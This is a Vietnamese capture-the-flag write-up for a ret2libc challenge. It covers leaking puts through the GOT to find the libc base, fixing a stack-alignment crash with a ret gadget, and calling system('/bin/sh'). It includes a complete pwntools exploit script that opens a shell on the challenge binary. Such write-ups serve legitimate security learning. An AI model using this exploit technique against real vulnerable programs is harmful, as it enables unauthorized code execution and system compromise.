# TASK3_RET2LIBC

bài này có dạng **ret2libc** nhưng mà khác phứt tạp 

**ida:**
![image](https://github.com/gookoosss/CTF.-/assets/128712571/3249d015-6e55-4671-9b21-454ea99e403b)



**checksec và vm:**

![image](https://github.com/gookoosss/CTF.-/assets/128712571/3bb94415-5847-40b0-8d2c-eacb60f52b36)


bài này ko thể dùng **ret2shellcode được vì NX đã mở**

cách đơn giản và quen thuộc nhất là **ret2libc** thôi

![image](https://github.com/gookoosss/CTF.-/assets/128712571/835e1788-d75e-48ed-85fc-7beb1bb0d102)


ta thấy có địa chỉ hàm **puts** trong **libc**, nên cách đơn giản là ta gán địa của **puts** trong **libc** vào **rdi** , sau đó dùng plt để thực thi hàng puts, từ đó mà ta có thể tính **địa chỉ base của libc**

**note:** cài này trong bof7 mình có giải thích rất kĩ và chi tiết rồi nên giờ mình chỉ nêu hướng làm thôi

![image](https://github.com/gookoosss/CTF.-/assets/128712571/9a9bd12f-56b0-48e5-8ada-31e45b59f9d6)


**Chú ý quan trọng:** địa chỉ base của libc phải là **libc.address** , lý do:

![image](https://github.com/gookoosss/CTF.-/assets/128712571/e61cbf43-2353-4f3a-8388-d0ce3701d4be)


**bonus:** 

![image](https://github.com/gookoosss/CTF.-/assets/128712571/29007dfa-981a-4a17-9b65-633207337f4e)


oke sau khi đó địa chỉ libc rồi thì ta chạy lại hàm main và nhập offset như cũ, sau đó gán **/bin/sh** trong libc vào **rdi**, cuối cùng là chạy hàm **system** là xong

![image](https://github.com/gookoosss/CTF.-/assets/128712571/4fe000d0-b5fd-45a2-a867-5aa84d6f43a0)


**có vẻ không như mong đợi**

![image](https://github.com/gookoosss/CTF.-/assets/128712571/da551338-acd0-4272-a2e8-c45a0c10088c)


ở đây có lỗi **xmm1** rồi

debug lại xem sao nào

![image](https://github.com/gookoosss/CTF.-/assets/128712571/7d554450-3e30-4204-988e-668df896c3ef)


**hmm như ta đã thầy thì địa rsp trỏ đến hàm system luôn là địa chỉ lẻ , ko thể chia hết cho 16, nên khi chạy vào system sẽ bị lỗi xmm1**


**lúc này rsp đang ở hàm ret, ta tìm 1 gadget của ret để đẩy hàm system lên địa chỉ chia hết cho 16**

giải thích thêm:

![image](https://github.com/gookoosss/CTF.-/assets/128712571/62511014-bd1d-40d5-8152-5b9521448a02)



**oke h tìm gadget của ret thôi**

![image](https://github.com/gookoosss/CTF.-/assets/128712571/5a3cefe4-2812-440f-9c88-e99caf921f43)


lấy cái đầu tiên là **0x000000000040101a**

h hoàn thiện script là xong

**à mà nếu thi ctf thực tế thì cần pwninit với file libc hợp lệ nha**


**script:**

```
from pwn import *

p = process('./libleak_patched')
exe = ELF('./libleak_patched')
libc = ELF('libc.so.6')

pop_rdi = 0x0000000000401313
ret_addr  = 0x000000000040101a

payload = b'a'*88 
payload += p64(pop_rdi) + p64(exe.got['puts'])
payload += p64(exe.plt['puts'])
payload += p64(exe.sym['main'])

p.sendlineafter(b'Give me something useful: ', payload)

libc_leak = u64(p.recv(6) + b'\0\0')
libc.address = libc_leak - libc.sym['puts']
log.info("libc leak: " + hex(libc_leak))
log.info("libc base: " + hex(libc.address))

gdb.attach(p, gdbscript = '''
b*main+158
c
''')

input()


payload = b'a'*88
payload += p64(pop_rdi) + p64(next(libc.search(b'/bin/sh')))
# payload += p64(ret_addr)
payload += p64(libc.sym['system'])
p.sendlineafter(b'Give me something useful: ', payload)


p.interactive()
```
chạy lại thì địa chỉ rsp là **0x007ffc0ae1cb90** nên ko bị lỗi **xmm1** nữa

![image](https://github.com/gookoosss/CTF.-/assets/128712571/e328d2b7-b429-4458-96fb-3b3d40b2dc3b)



**xong rồi nè**

![image](https://github.com/gookoosss/CTF.-/assets/128712571/4bcb947c-2d9a-45d5-88c2-18b4123ab230)


**à bonus thêm cách 2 dùng địa chỉ đề tặng nè:**

![image](https://github.com/gookoosss/CTF.-/assets/128712571/2aa08d02-bea3-4816-936d-f18e4f3304ea)


**check ida thì thấy địa chỉ đề cho là của hàm sleep, ta có thể leak địa chỉ này bằng cách dùng recvuntil và recvall, sau đó dùng địa chỉ sleep này để tính offset đến địa chỉ base của libc, và thế là ta đã có được địa chỉ libc mà ko cần dùng cách thông thường**

mệt xỉu :(( 
